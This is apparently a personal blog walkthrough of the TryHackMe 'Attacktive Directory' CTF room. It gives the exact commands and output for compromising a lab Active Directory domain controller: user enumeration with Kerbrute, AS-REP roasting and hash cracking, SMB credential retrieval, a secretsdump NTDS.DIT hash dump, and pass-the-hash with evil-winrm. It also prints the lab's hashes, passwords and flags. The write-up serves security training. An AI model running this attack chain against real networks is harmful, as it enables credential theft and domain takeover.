---
title: Attacktive Directory
date: 2022-06-20 18:32:00 -0500
categories: [Walkthrough, Tryhackme, CTF]
tags: [nmap, enum4linux, Active Directory, john, smb]
---

99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?

[https://tryhackme.com/room/attacktivedirectory](https://tryhackme.com/room/attacktivedirectory)

![Attacktive Directory Nessus](/assets/rpnessusredux01.png)

* * *

## Task 3 - Welcome to Attacktive Directory 

```shell
┌──(0xskar㉿cocokali)-[~/thm/AttacktiveDirectory]
└─$ nmap -sV -sC -T4 10.10.132.136 -p- -oN initial
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 06:44 PDT
Nmap scan report for 10.10.132.136
Host is up (0.20s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-20 13:52:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-06-20T13:53:52+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-06-20T13:53:44+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-06-19T13:26:08
|_Not valid after:  2022-12-19T13:26:08
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49806/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-20T13:53:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 576.98 seconds
```

##   Answer the questions below

**What tool will allow us to enumerate port 139/445?**

- ``enum4linux -a 10.10.132.136 -R 139,445``
- enum4linux

**What is the NetBIOS-Domain Name of the machine?**

- THM-AD

**What invalid TLD do people commonly use for their Active Directory Domain?**

- .local

* * * 

## Task 4 - Enumeration Enumerating Users via Kerberos 

Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called Kerbrute (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!

##   Answer the questions below

**What command within Kerbrute will allow us to enumerate valid usernames?**

- userenum

**What notable account is discovered? (These should jump out at you)**

- ``./kerbrute_linux_amd64 userenum --dc 10.10.132.136:88 -d spookysec.local userlist.txt``

```shell
2022/06/20 07:49:18 >  [+] VALID USERNAME:       james@spookysec.local
2022/06/20 07:49:21 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/06/20 07:49:25 >  [+] VALID USERNAME:       James@spookysec.local
2022/06/20 07:49:26 >  [+] VALID USERNAME:       robin@spookysec.local
2022/06/20 07:49:43 >  [+] VALID USERNAME:       darkstar@spookysec.local
2022/06/20 07:49:53 >  [+] VALID USERNAME:       administrator@spookysec.local
2022/06/20 07:50:12 >  [+] VALID USERNAME:       backup@spookysec.local
2022/06/20 07:50:21 >  [+] VALID USERNAME:       paradox@spookysec.local
2022/06/20 07:51:19 >  [+] VALID USERNAME:       JAMES@spookysec.local
2022/06/20 07:51:39 >  [+] VALID USERNAME:       Robin@spookysec.local
2022/06/20 07:53:35 >  [+] VALID USERNAME:       Administrator@spookysec.local
2022/06/20 07:57:30 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2022/06/20 07:58:45 >  [+] VALID USERNAME:       Paradox@spookysec.local
2022/06/20 08:03:03 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2022/06/20 08:04:17 >  [+] VALID USERNAME:       ori@spookysec.local
2022/06/20 08:06:32 >  [+] VALID USERNAME:       ROBIN@spookysec.local
```

**What is the other notable account is discovered? (These should jump out at you)**

- svc-admin

**What is the other notable account is discovered? (These should jump out at you)**

- backup

* * *

## Task 5 - Exploitation Abusing Kerberos 

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

##   Answer the questions below

**We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?**

- ``/opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.10.132.136 -usersfile users.txt -format hashcat -outputfile hashes.txt``
- svc-admin

**Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)**

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f45f55f20e6fab0b565c84565e77bf8c$6fc870818e2691f65612966f462ec3d973acaeab9cd87dcf13e50a9454945c8de2f046e6b02f440b5232c9cc34cb18f4485915206a8e3264c4aee2e9442ff8104c9389ab4ae875c90916b5accb02680e7e781a71c95df510ffc11a3fc36cb0ae36bb48b03a8ebd617c1a3532e3e439acf5e4d097498aa91c08aa3ded9a54ad91a7aefcfa1ac4ee47f5bb85e38f9174bdac51a7a3896b52833f5448f246d08797f199e004ea4ecd77f6b57d01a26e6930fea74f331143f356d392c6f8ec8f394b1602557611cb585fe2d189cf5d01f7a1a272255b4f350640104b94c40cb8605b3eff072fc5e502fe49e5230c26384012e952
```

- https://hashcat.net/wiki/doku.php?id=example_hashes
- Kerberos 5, etype 23, AS-REP

**What mode is the hash?**

- https://hashcat.net/wiki/doku.php?id=example_hashes
- 18200

**Now crack the hash with the modified password list provided, what is the user accounts password?**

- ``john --wordlist=passwordlist.txt --format=krb5asrep hash.txt``
- management2005

* * * 

## Task 5 Exploitation Abusing Kerberos

##  Enumeration:

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

``man smbclient``

##   Answer the questions below

**What utility can we use to map remote SMB shares?**

- ``smbclient``

**Which option will list shares?**

- ``-L``

**How many remote shares is the server listing?**

- ``smbclient -L \\\\10.10.132.136 --workgroup=spookysec.local -U "svc-admin"``
- 6 shares

**There is one particular share that we have access to that contains a text file. Which share is it?**

- ``smbclient \\\\10.10.132.136\\backup\\ --workgroup=spookysec.local -U "svc-admin"``

**What is the content of the file?**

- ``mget backup_credentials.txt``
- YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

**Decoding the contents of the file, what is the full contents?**

- base64 decrypt = ``backup@spookysec.local:backup2517860``

* * * 

## Task 7 - Domain Privilege Escalation - Elevating Privileges within the Domain 

Now that we have ``backup@spookysec.local:backup2517860`` We can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the (AD) Active Directory Domain.

##   Answer the questions below

```shell
┌──(0xskar㉿cocokali)-[~/thm/AttacktiveDirectory]
└─$ /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.132.136 -outputfile secretsdump.txt 
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:e3a602bef4ccbcbc0c468b0dd6d50e7d:::
[*] Kerberos keys grabbed
```

**What method allowed us to dump NTDS.DIT?**

- DRSUAPI

**What is the Administrators NTLM hash?**

- 0e0363213e37b94221497260b0bcb4fc

**What method of attack could allow us to authenticate as the user without the password?**

- Pass the Hash

**Using a tool called Evil-WinRM what option will allow us to use a hash?**

- ``evil-winrm -h`` -H, --hash HASH                  NTHash

* * * 

## Task 8 - Flag Submission Flag Submission Panel 

Cool site: https://wadcoms.github.io/#

Submit the flags for each user account. They can be located on each user's desktop.

##   Answer the questions below

##  svc-admin 

- credentials user:svc-admin pass:management2005
- TryHackMe{K3rb3r0s_Pr3_4uth}

##  backup

- credentials user:backup pass:backup2517860
- TryHackMe{B4ckM3UpSc0tty!}

##  Administrator

- credentials user:Administrator pass: We can Pass the Hash with below command.

```shell
┌──(0xskar㉿cocokali)-[~/thm/AttacktiveDirectory]
└─$ evil-winrm -i 10.10.132.136 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

- TryHackMe{4ctiveD1rectoryM4st3r}

* * * 